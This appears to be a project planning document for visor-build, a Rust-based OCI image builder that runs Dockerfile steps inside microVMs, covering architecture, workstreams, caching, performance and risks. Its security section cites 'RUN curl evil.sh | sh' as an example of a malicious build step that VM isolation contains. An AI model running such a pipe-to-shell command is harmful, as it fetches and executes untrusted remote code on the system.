# P8 — visor-build: Native OCI Image Builder

> **Status**: Planning
> **Phase**: P8 (follows P7 feature-complete macOS + Docker API compat)
> **Goal**: Build OCI images natively in Rust — no BuildKit, no Go, no 100MB binary dependency

## Problem Statement

visor replaces Docker Desktop for local development. Users can `docker run` and `docker compose up`
against visor today. But `docker build` returns 501:

```rust
pub async fn build_not_supported() -> Response {
    docker_error(StatusCode::NOT_IMPLEMENTED, "Build not supported...")
}
```

Without image building, developers still need Docker installed — defeating the purpose of visor as
a standalone replacement. Every competitor solves this by bundling a **50-100MB Go binary**
(buildkitd) inside a Linux VM:

| Tool            | Build Engine     | Binary Size | Requires          |
| --------------- | ---------------- | ----------- | ----------------- |
| Docker Desktop  | BuildKit (in-VM) | ~500MB app  | LinuxKit VM       |
| Colima          | BuildKit (in-VM) | ~100MB      | Lima VM + Docker  |
| Rancher Desktop | BuildKit (in-VM) | ~100MB      | Lima VM + Docker  |
| Finch (AWS)     | BuildKit (in-VM) | ~100MB      | Lima VM + nerdctl |
| Podman          | Buildah (Go lib) | ~80MB       | buildah + runc    |
| **visor-build** | **Native Rust**  | **~2MB**    | **Nothing**       |

visor's kernel is 10MB and its binary is 10MB. Adding 100MB of Go defeats the architecture.

### Why Native Rust?

visor already has 80% of the infrastructure needed to build images:

| Build Step       | Required                        | visor Already Has?                         |
| ---------------- | ------------------------------- | ------------------------------------------ |
| Parse Dockerfile | Instruction parser              | ❌ `parse-dockerfile` crate exists         |
| `FROM`           | Pull base image, unpack layers  | ✅ OCI pipeline (registry + cache + merge) |
| `COPY`/`ADD`     | Stage files into build root     | ✅ virtio-fs mounts                        |
| `RUN`            | Execute command in isolated env | ✅ microVM execution via vsock             |
| Layer snapshot   | Diff filesystem after each step | ❌ need overlayfs + tar creation           |
| Image assembly   | OCI manifest + config           | ❌ `oci-spec-rs` crate exists              |
| Registry push    | Upload to registry              | ❌ `oci-client` crate exists               |
| Build cache      | Skip unchanged instructions     | ❌ need cache key computation              |

The missing 20% is orchestration + layer creation + image assembly. The key architectural
insight: **visor's VM execution engine IS the build sandbox**. We don't need runc or namespaces —
we have hardware-isolated microVMs.

## Architecture Decisions

### Native Rust Builder (No Go Dependencies)

Build OCI images using visor's existing microVM infrastructure. Each `RUN` instruction executes
inside a hardware-isolated VM via vsock — the same path `visor exec` uses today.

```text
visor build -t myapp .
    │
    ▼
visor-build crate (pure Rust, platform-agnostic)
    │
    ├── parse Dockerfile      ← parse-dockerfile crate
    ├── pull base image       ← existing OCI pipeline
    ├── boot build VM         ← existing visor-vmm
    ├── execute RUN           ← existing vsock exec
    ├── snapshot layers       ← NEW: overlayfs in guest
    ├── assemble OCI image    ← oci-spec-rs + tar + flate2
    └── push to registry      ← oci-client crate
```

No `#[cfg(target_os)]` needed in visor-build. The platform abstraction lives in visor-vmm.

### OverlayFS Inside Guest for Per-Instruction Layers

Per-instruction caching requires creating a layer after each `RUN` instruction. The guest kernel
manages an overlayfs mount:

```text
Guest filesystem layout:
  / (merged)      ← overlayfs, where RUN commands execute
  /rootfs         ← ext4 block device (base image layers)
  /overlay/upper  ← tmpfs (changes from current instruction)
  /overlay/work   ← tmpfs (overlayfs bookkeeping)

After each RUN:
  1. Host sends vsock "snapshot_layer" command
  2. Guest: tar -czf - -C /overlay/upper . → binary stream via vsock
  3. Host receives layer blob, computes digests, caches it
  4. Host sends vsock "flatten_overlay" command
  5. Guest: merge upper into lower, reset upper for next instruction
```

This requires new visor-init agent methods (`overlay_init`, `snapshot_layer`, `flatten_overlay`)
and a binary data channel over vsock.

### Multi-Stage as Core Architecture

Multi-stage is not a feature bolt-on — it's the core execution model. Every build is multi-stage
(single-stage is just one stage). Each stage maintains independent state:

```rust
struct StageState {
    name: Option<String>,          // FROM ... AS <name>
    base_layers: Vec<LayerDigest>, // from base image
    built_layers: Vec<LayerDigest>, // from instructions in this stage
    env: HashMap<String, String>,  // accumulated ENV
    working_dir: String,           // current WORKDIR
    user: Option<String>,          // current USER
    shell: Vec<String>,            // current SHELL
    filesystem: PathBuf,           // merged directory tree for this stage
}
```

`COPY --from=builder /app /app` looks up the "builder" stage's filesystem and copies from it.
`--target=builder` stops after the named stage. Unreferenced stages are skipped (DAG execution).

### Build Cache Strategy

Per-instruction caching with content-based invalidation:

```text
cache_key = sha256(
    instruction_type    +  // "RUN", "COPY", etc.
    instruction_text    +  // normalized command
    parent_layer_digest    // compressed digest of previous layer
)

For COPY/ADD instructions:
    cache_key += sha256(source_file_contents)
```

Cache storage: `~/.visor/build-cache/{cache_key} → layer_digest` mapping file +
layer blobs in the existing `LayerCache` (`~/.visor/cache/blobs/sha256/`).

Any cache miss invalidates all subsequent instructions (same as Docker/BuildKit).

### Docker API `/build` Compatibility

Support the legacy `POST /build` endpoint (tar body, chunked JSON response). This is what
`docker build` sends when not using BuildKit's gRPC session protocol. Every Docker CLI supports it.

```text
docker build -t myapp .
    │
    └── POST /build (Content-Type: application/x-tar)
        Query: dockerfile=Dockerfile&t=myapp:latest
        Body: tar archive of build context
        Response: chunked {"stream": "Step 1/5 : FROM ubuntu\n"}
```

The BuildKit gRPC session protocol (`POST /session` with HTTP/2 upgrade) is deferred — the
legacy endpoint covers all use cases including `docker compose build`.

### New Dependencies

| Crate              | Version | Purpose                                | Size Impact |
| ------------------ | ------- | -------------------------------------- | ----------- |
| `parse-dockerfile` | 0.1.4   | Dockerfile → AST (all 18 instructions) | ~50KB       |
| `oci-spec`         | 0.9.0   | OCI manifest/config builder types      | ~100KB      |
| `oci-client`       | 0.16.0  | Registry push (blobs + manifests)      | ~200KB      |
| `ignore`           | 0.4.25  | .dockerignore file parsing             | ~150KB      |

Total binary size increase: **~2MB** (vs ~100MB for buildkitd + runc).

## Workstreams

### WS1 — Foundation

#### WS1.1 — Crate Scaffolding + Dockerfile Parsing

**Priority**: P1 | **Effort**: Short (45 min)

Create `crates/visor-build/` with Dockerfile parsing via `parse-dockerfile` crate.

**Changes:**

1. Create crate with `Cargo.toml`, add workspace dependencies
2. Implement `DockerfileParser` wrapper around `parse-dockerfile`
3. Map parsed instructions to internal `BuildInstruction` enum
4. Implement ARG/ENV variable substitution (`${VAR}`, `${VAR:-default}`, `${VAR:+alt}`)
5. Parse `.dockerignore` using `ignore` crate
6. Handle `ENV`/`LABEL` raw string splitting into `KEY=VALUE` pairs

**Acceptance**: Parse any production Dockerfile (multi-stage, heredoc, ARG substitution) into
typed instruction list. `.dockerignore` filters build context correctly.

#### WS1.2 — visor-init Overlay Support

**Priority**: P1 | **Effort**: Medium (2-3h)

Add overlayfs management and binary data streaming to visor-init's vsock agent.

**Changes:**

1. New agent method `overlay_init` — set up overlayfs mount (lowerdir=/rootfs, upperdir, workdir)
2. New agent method `snapshot_layer` — create tar.gz of /overlay/upper, stream binary over vsock
3. New agent method `flatten_overlay` — merge upper into lower, reset upper for next instruction
4. New binary vsock data channel — separate from JSON-RPC text protocol (new vsock port or
   length-prefixed binary frames on existing connection)
5. Handle kernel whiteout devices (`c 0 0`) → convert to OCI `.wh.` entries during tar creation

**Acceptance**: Guest can set up overlayfs, execute commands on merged view, snapshot changes as
tar.gz, and flatten for next instruction. Round-trip tested via vsock from host.

### WS2 — Build Engine

#### WS2.1 — Multi-Stage Build Engine

**Priority**: P1 | **Effort**: High (3-4h)

Core build orchestrator that executes Dockerfile instructions across multiple stages.

**Changes:**

1. `BuildEngine` struct — owns stage state, cache, and VM lifecycle
2. `FROM` handler — pull base image via existing `RegistryClient` + `LayerMerger`, or reference
   previous stage's filesystem for `COPY --from`
3. `RUN` handler — boot VM (if not running), vsock exec command, check exit code, snapshot layer
4. `COPY`/`ADD` handler — from build context: share via virtio-fs, vsock exec `cp` in guest.
   From stage (`--from`): copy from named stage's filesystem directory on host
5. Metadata handlers — `ENV`, `WORKDIR`, `CMD`, `ENTRYPOINT`, `EXPOSE`, `LABEL`, `USER`,
   `SHELL`, `STOPSIGNAL`, `HEALTHCHECK`, `VOLUME` — accumulate in stage state
6. `ARG` handler — build-time variable with `--build-arg` override
7. `--target` support — stop after named stage, skip all subsequent stages
8. DAG execution — skip stages not referenced by the final stage (BuildKit optimization)
9. Progress callback — stream `Step N/M : instruction` progress to caller

**Acceptance**: Multi-stage Dockerfiles with `COPY --from`, `--target`, `--build-arg`, and all
standard instructions execute correctly. Progress streams to caller.

#### WS2.2 — Mount Flags (cache, secret, bind)

**Priority**: P1 | **Effort**: Medium (1-1.5h)

Support `RUN --mount=type=cache|secret|bind|tmpfs` flags.

**Changes:**

1. Parse `--mount` flags from `parse-dockerfile` AST (already parsed as `Flag` types)
2. `type=cache` — create persistent host directory at `~/.visor/build-cache/mounts/{id}`,
   add to `VmConfig.shared_dirs` when booting build VM, mount inside guest at target path
3. `type=secret` — mount secret file via virtio-fs (read-only), inject at `/run/secrets/{id}`.
   Exclude secret mount path from layer snapshot (not written to any layer)
4. `type=bind` — bind mount from build context or named stage
5. `type=tmpfs` — guest-side tmpfs mount at target path

**Acceptance**: `RUN --mount=type=cache,target=/go/pkg/mod go build` reuses cached Go modules
across builds. `RUN --mount=type=secret,id=key` injects secret without layer leak.

### WS3 — Layer Engine

#### WS3.1 — Layer Creation + Whiteout Generation

**Priority**: P1 | **Effort**: High (3-4h)

Create OCI-compliant layer tarballs from filesystem diffs.

**Changes:**

1. Receive tar.gz stream from guest overlay snapshot (from WS1.2)
2. Validate tar entries — relative paths with `./` prefix per OCI spec
3. Convert kernel whiteout character devices (`c 0 0`) to OCI `.wh.<name>` entries
4. Handle opaque whiteouts (`.wh..wh..opq`) for directory replacements
5. Track hardlinks via `(device, inode) → first_path` map
6. Preserve file attributes — permissions, uid/gid, mtime, symlinks, xattrs (PAX extensions)
7. Compute dual digests — SHA-256 of uncompressed tar (DiffID for config) and compressed
   tar.gz (digest for manifest) using `HashWriter` wrapper
8. Store layer blob in `LayerCache` (content-addressable, atomic write)
9. Double-walk diff fallback — for when overlay snapshot isn't available (e.g. COPY-only
   instructions that modify the host directory tree before VM boot)

**Acceptance**: Layer tarballs match OCI image spec. Whiteouts for deletions. Hardlinks preserved.
Both compressed and uncompressed digests computed correctly.

#### WS3.2 — Image Assembly + OCI Layout

**Priority**: P1 | **Effort**: Medium (1.5-2h)

Assemble built layers into a complete OCI image.

**Changes:**

1. Generate image config JSON using `oci-spec-rs` `ImageConfigurationBuilder`:
   - `architecture` + `os` from host (or base image)
   - `config` section: CMD, ENTRYPOINT, ENV, WORKDIR, USER, EXPOSE, LABEL, STOPSIGNAL, VOLUMES
   - `rootfs.diff_ids`: ordered list of uncompressed layer digests
   - `history`: one entry per instruction (command text, empty_layer flag for metadata-only)
2. Generate manifest JSON using `oci-spec-rs` `ImageManifestBuilder`:
   - `config` descriptor pointing to config blob
   - `layers` descriptors with compressed digests, sizes, media types
3. Write OCI layout to disk:
   ```text
   ~/.visor/images/{tag}/
     oci-layout                    → {"imageLayoutVersion": "1.0.0"}
     index.json                    → image index pointing to manifest
     blobs/sha256/{config-digest}  → image config JSON
     blobs/sha256/{manifest-digest} → manifest JSON
     blobs/sha256/{layer-digests}  → layer tar.gz blobs (symlinks to cache)
   ```
4. Image tagging — `ImageStore` with `tag()`, `get_by_tag()`, `list_tags()` backed by
   `~/.visor/images/tags.json`
5. Wire into existing `visor images` and `visor rmi` CLI commands

**Acceptance**: Built images appear in `visor images` / `docker images`. Can be used with
`visor run` / `docker run` without re-pulling from registry.

### WS4 — Build Cache

#### WS4.1 — Per-Instruction Cache

**Priority**: P1 | **Effort**: Medium (1.5-2h)

Skip cached instructions on rebuild. This is what makes builds fast during development.

**Changes:**

1. Cache key computation:
   - `RUN`: `sha256(instruction_text + parent_layer_digest)`
   - `COPY`/`ADD`: `sha256(instruction_text + parent_layer_digest + content_hash_of_sources)`
   - Metadata (ENV/WORKDIR/CMD/etc.): `sha256(instruction_text + parent_layer_digest)` with
     `empty_layer: true`
2. Content hashing for COPY/ADD — walk source files, hash contents + metadata (mtime, mode)
3. Cache store — `~/.visor/build-cache/instructions.json` maps cache_key → layer_digest
4. Cache lookup — before each instruction, check if cached layer exists
5. Cache resume — on first miss, execute from that point. All subsequent instructions rebuild.
6. Cache invalidation — `visor build --no-cache` bypasses cache entirely
7. Cache pruning — `visor builder prune` removes unused cache entries

**Acceptance**: Changing last line of Dockerfile only rebuilds from that point. Unchanged
instructions complete instantly. `--no-cache` forces full rebuild.

### WS5 — Integration

#### WS5.1 — Docker API `/build` Endpoint

**Priority**: P1 | **Effort**: Medium (1-1.5h)

Replace the 501 stub with a real build handler.

**Changes:**

1. Accept `POST /build` — extract tar body (build context)
2. Parse query params: `dockerfile`, `t` (tag), `buildargs`, `target`, `nocache`
3. Extract build context tar to temp directory
4. Parse `.dockerignore` and filter context
5. Call `BuildEngine::build()` with parsed config
6. Stream progress as chunked JSON: `{"stream": "Step 1/5 : FROM ubuntu\n"}`
7. On error: `{"error": "message"}` in stream
8. On success: return image ID in final stream message
9. Wire route: replace `build_not_supported()` in `visor-docker/src/lib.rs:166`

**Acceptance**: `DOCKER_HOST=unix:///var/run/visor.sock docker build -t myapp .` builds and tags
image. `docker compose build` works for multi-service projects.

#### WS5.2 — CLI `visor build` + `visor push`

**Priority**: P1 | **Effort**: Short (30-45 min)

CLI commands for building and pushing images.

**Changes:**

1. `visor build -t tag .` — package context as tar, POST to `/v1/images/build` or `/build`
2. `visor build --target=stage` — build specific stage
3. `visor build --build-arg KEY=VAL` — pass build arguments
4. `visor build --no-cache` — force full rebuild
5. `visor push tag` — push built image to registry
6. Progress display — print `Step N/M` lines, show layer upload progress

**Acceptance**: `visor build -t myapp . && visor push myapp:latest` builds and pushes to Docker
Hub / GHCR.

#### WS5.3 — Registry Push (oci-client)

**Priority**: P1 | **Effort**: Medium (1.5-2h)

Push built images to any OCI-compatible registry.

**Changes:**

1. Integrate `oci-client` crate for push operations
2. Auth — support Basic (username/password) and Bearer (token) via `~/.docker/config.json`
   (same auth file Docker uses)
3. Dedup — call `blob_exists()` before uploading (skip layers already in registry)
4. Push blobs — concurrent layer upload (up to 8 parallel, chunked 4MB transfers)
5. Push config — upload config blob
6. Push manifest — upload manifest with tag
7. Handle registry quirks — AWS ECR missing Location header, Docker Hub token scoping

**Acceptance**: `visor push myapp:latest` uploads to Docker Hub, GHCR, and AWS ECR. Existing
layers are not re-uploaded (dedup via `blob_exists`).

## Performance Analysis

### Build Speed Comparison

The dominant factor in build speed is **cache hit rate**, not the builder itself. A cached
instruction takes <1ms regardless of builder. An uncached `RUN apt-get install` takes the same
wall-clock time in any builder — it's the package manager that's slow, not the build tool.

The builder-specific overhead is:

| Phase              | BuildKit (runc)     | buildah (chroot)     | visor-build (microVM)     |
| ------------------ | ------------------- | -------------------- | ------------------------- |
| Container/VM start | ~50-100ms (runc)    | ~10-30ms (chroot)    | ~150ms (first RUN only)   |
| Subsequent RUN     | ~50-100ms each      | ~10-30ms each        | ~0ms (VM already running) |
| Layer snapshot     | ~5-20ms (overlayfs) | ~10-50ms (diff walk) | ~10-30ms (overlay tar)    |
| COPY from context  | ~1-5ms              | ~1-5ms               | ~5-10ms (virtio-fs)       |
| Cache check        | <1ms                | <1ms                 | <1ms                      |
| Image assembly     | ~5-10ms             | ~5-10ms              | ~5-10ms                   |

**Key insight**: BuildKit starts a new runc container for **every RUN instruction** (~50-100ms
each). visor-build boots the VM once and reuses it for all RUN instructions in a stage. For a
Dockerfile with 10 RUN instructions:

```text
BuildKit:    10 × ~75ms container start = ~750ms overhead
visor-build:  1 × ~150ms VM boot + 9 × ~0ms = ~150ms overhead

Winner: visor-build (5x less overhead for multi-RUN Dockerfiles)
```

### Cached Rebuild Performance

Cached rebuilds are where per-instruction caching dominates. Both BuildKit and visor-build skip
cached instructions entirely — the performance is identical:

```text
Scenario: 20-instruction Dockerfile, last instruction changed

BuildKit:    19 cache hits (<1ms each) + 1 uncached RUN = ~19ms + RUN time
visor-build: 19 cache hits (<1ms each) + 1 uncached RUN = ~19ms + RUN time

Identical. Cache hit rate is all that matters.
```

### Cold Build Performance (No Cache)

For a fresh build with no cache, the bottleneck is the `RUN` instructions themselves (package
installs, compilation). Builder overhead is negligible:

```text
Scenario: Go project, fresh build, no cache

    FROM golang:1.22              ← pull: ~5s (both identical)
    COPY go.mod go.sum ./         ← <100ms (both identical)
    RUN go mod download           ← ~30s (network-bound, identical)
    COPY . .                      ← <100ms (both identical)
    RUN go build -o /app          ← ~60s (CPU-bound, identical)

Total build time: ~95s
Builder overhead: <1s (irrelevant)
```

The builder overhead is <1% of total build time for real-world builds.

### Where visor-build Wins

#### 1. Security (Hardware Isolation)

This is the primary competitive advantage.

| Threat                       | BuildKit (runc) | buildah (chroot) | visor-build (microVM)  |
| ---------------------------- | --------------- | ---------------- | ---------------------- |
| Container escape             | Possible (CVEs) | Easier (chroot)  | **Not possible (VM)**  |
| Kernel exploit from RUN      | Shared kernel   | Shared kernel    | **Separate kernel**    |
| Malicious Dockerfile         | Namespace jail  | chroot jail      | **Hardware isolation** |
| Supply chain attack in build | Host exposure   | Host exposure    | **VM-contained**       |

Every `RUN` instruction executes inside a hardware-isolated microVM. A malicious `RUN curl
evil.sh | sh` can compromise the build VM but cannot escape to the host. BuildKit's runc
containers share the host kernel — a kernel exploit in a `RUN` instruction compromises the host.

This matters for:

- CI/CD pipelines building untrusted code (open source PRs)
- Multi-tenant build services
- Compliance environments (SOC2, HIPAA) where build isolation is audited

#### 2. Package Size

```text
visor (complete):          ~22MB  (kernel + visor binary + visor-build)
Docker Desktop:           ~500MB  (app + LinuxKit VM + dockerd + buildkitd)
Colima + Docker:          ~150MB  (Lima + QEMU + dockerd + buildkitd + runc)
Podman + buildah:          ~80MB  (podman + buildah + runc + crun)
```

visor is **7-25x smaller** than alternatives while providing superior isolation.

#### 3. Cross-Platform Consistency

```text
visor-build on macOS:  same binary, same code path, same behavior
visor-build on Linux:  same binary, same code path, same behavior

BuildKit on macOS:     runs inside Linux VM (different behavior, file sharing overhead)
BuildKit on Linux:     runs natively (different code path than macOS)
```

No "works on my Mac but not in CI" issues. The build environment is identical because it's
always a microVM, regardless of host OS.

#### 4. Integrated Architecture

```text
visor workflow:
  visor build -t myapp .     ← builds image
  visor run myapp             ← runs from local store (instant, no pull)
  visor push myapp:latest     ← pushes to registry

Docker Desktop workflow:
  docker build -t myapp .     ← builds inside LinuxKit VM
  docker run myapp             ← runs inside LinuxKit VM
  docker push myapp:latest     ← pushes from LinuxKit VM

  (all operations cross VM boundary, gRPC-FUSE file sharing overhead)
```

visor-build stores images directly in visor's local image store. `visor run` after `visor build`
is instant — no registry round-trip, no VM-to-host file copy.

#### 5. RUN --mount=type=cache Performance

BuildKit's persistent cache directories live inside the buildkitd daemon. visor-build's cache
directories live on the host filesystem and are mounted into the build VM via virtio-fs. This
means:

- Cache persists across visor restarts (no daemon state to lose)
- Cache is accessible from host tools (inspect, clean, backup)
- No Docker volume overhead for cache management

### Where visor-build is Comparable

| Aspect               | vs BuildKit | Notes                            |
| -------------------- | ----------- | -------------------------------- |
| Cached rebuild speed | Equal       | Both skip cached instructions    |
| Cold build speed     | Equal       | RUN time dominates, not builder  |
| Layer compression    | Equal       | Same tar + gzip/zstd             |
| Multi-stage builds   | Equal       | Same Dockerfile semantics        |
| Registry push speed  | Equal       | Network-bound, not builder-bound |

### Where visor-build is Initially Slower

| Aspect                   | vs BuildKit     | Mitigation                         |
| ------------------------ | --------------- | ---------------------------------- |
| First RUN instruction    | +50ms (VM boot) | VM stays running for all RUNs      |
| COPY via virtio-fs       | +5ms            | Negligible vs actual file I/O      |
| Parallel stage execution | Not in V1       | Sequential is fine; parallelize V2 |

### Competitive Position Summary

```text
                    Security    Size    Speed    Features    Cross-Platform
BuildKit            ★★☆☆☆      ★★☆☆☆  ★★★★★   ★★★★★      ★★☆☆☆
buildah             ★★☆☆☆      ★★★☆☆  ★★★★☆   ★★★☆☆      ★★☆☆☆
kaniko              ★★★☆☆      ★★☆☆☆  ★★☆☆☆   ★★☆☆☆      ★★★☆☆
Docker Desktop      ★★☆☆☆      ★☆☆☆☆  ★★★★☆   ★★★★★      ★★★★☆
visor-build         ★★★★★      ★★★★★  ★★★★☆   ★★★★☆      ★★★★★
```

visor-build trades BuildKit's parallel stage execution (V2 feature) for **hardware-isolated
builds, 25x smaller footprint, and true cross-platform consistency**. For the target audience
(developers replacing Docker Desktop), this is a decisive advantage.

## Priority Summary

### P1 — Must Have (production-grade builds)

| ID    | Task                              | Effort   | Tests | Impact                    |
| ----- | --------------------------------- | -------- | ----- | ------------------------- |
| WS1.1 | Crate + Dockerfile parsing        | 45 min   | ~12   | Foundation                |
| WS1.2 | visor-init overlay support        | 2-3h     | ~12   | Layer snapshot capability |
| WS2.1 | Multi-stage build engine          | 3-4h     | ~25   | Core builder              |
| WS2.2 | Mount flags (cache, secret, bind) | 1-1.5h   | ~8    | Production Dockerfiles    |
| WS3.1 | Layer creation + whiteouts        | 3-4h     | ~20   | OCI-compliant layers      |
| WS3.2 | Image assembly + OCI layout       | 1.5-2h   | ~10   | Usable built images       |
| WS4.1 | Per-instruction build cache       | 1.5-2h   | ~12   | Fast rebuilds             |
| WS5.1 | Docker API /build endpoint        | 1-1.5h   | ~8    | `docker build` works      |
| WS5.2 | CLI visor build + visor push      | 30-45min | ~5    | Native CLI                |
| WS5.3 | Registry push (oci-client)        | 1.5-2h   | ~10   | Deploy built images       |

**Total P1**: 16-22 hours | ~122 tests

### Post-V1 — Optimization (not blocking production use)

| ID | Task                        | Effort | Impact                       |
| -- | --------------------------- | ------ | ---------------------------- |
| -  | Parallel stage execution    | 3-4h   | Faster multi-stage builds    |
| -  | Remote cache (--cache-from) | 2-3h   | CI/CD cache sharing          |
| -  | BuildKit gRPC session       | 4-6h   | `docker buildx build` compat |
| -  | RUN --mount=type=ssh        | 1-2h   | SSH agent forwarding         |
| -  | --platform cross-build      | 4-6h   | Multi-arch image building    |

## Implementation Order

```text
Phase A (Foundation):     WS1.1 → WS1.2
Phase B (Engine):         WS2.1 → WS2.2
Phase C (Layers):         WS3.1 → WS3.2
Phase D (Cache):          WS4.1
Phase E (Integration):    WS5.1 → WS5.2 → WS5.3
```

**Rationale**: Foundation first (parsing + guest overlay support). Then the engine that uses them.
Then layer creation that the engine produces. Then cache that wraps the engine. Finally,
integration endpoints that expose it all.

## Dependencies

```text
WS1.2 (guest overlay) depends on visor-init agent extensibility
WS2.1 (build engine) depends on WS1.1 (Dockerfile parsing) + WS1.2 (overlay)
WS2.2 (mount flags) depends on WS2.1 (build engine)
WS3.1 (layer creation) depends on WS1.2 (overlay snapshots)
WS3.2 (image assembly) depends on WS3.1 (layer creation)
WS4.1 (build cache) depends on WS3.1 (layer creation)
WS5.1 (Docker API) depends on WS2.1 (build engine)
WS5.2 (CLI) depends on WS5.1 (Docker API)
WS5.3 (registry push) depends on WS3.2 (image assembly)
```

## Risk Assessment

| Risk                              | Impact | Likelihood | Mitigation                                                    |
| --------------------------------- | ------ | ---------- | ------------------------------------------------------------- |
| Guest overlayfs kernel support    | High   | Low        | Visor kernel is standard Linux; overlayfs included since 3.18 |
| Binary vsock streaming latency    | Medium | Medium     | Base64 fallback over existing exec (33% overhead, acceptable) |
| parse-dockerfile missing features | Low    | Low        | Actively maintained (Mar 2026), covers all 18 instructions    |
| oci-client registry edge cases    | Medium | Medium     | Test against Docker Hub, GHCR, ECR; handle known quirks       |
| ext4 mounting on host for COPY    | Medium | Low        | Already have mke2fs; use debugfs for reads on macOS           |
| Layer ordering in multi-stage     | Medium | Medium     | Careful state management; TDD catches ordering bugs           |

## Success Criteria

P8 is complete when:

- [ ] `visor build -t myapp .` builds from any standard Dockerfile
- [ ] `docker build -t myapp .` works via Docker API compat layer
- [ ] Multi-stage builds with `COPY --from=stage` work correctly
- [ ] `--target=stage` builds only up to named stage
- [ ] `--build-arg KEY=VAL` passes build arguments
- [ ] `RUN --mount=type=cache` persists package manager caches across builds
- [ ] `RUN --mount=type=secret` injects secrets without layer leak
- [ ] Per-instruction build cache: changing last line only rebuilds from that point
- [ ] `visor push myapp:latest` uploads to Docker Hub / GHCR
- [ ] `.dockerignore` filters build context
- [ ] Built images appear in `visor images` and run with `visor run`
- [ ] Cross-platform: same behavior on macOS (HVF) and Linux (KVM)
- [ ] All quality gates pass (clippy, test, dprint, no unwrap in production)
- [ ] ~122 tests covering all build features (TDD)
- [ ] No Go binaries, no external build tools, no 100MB dependencies
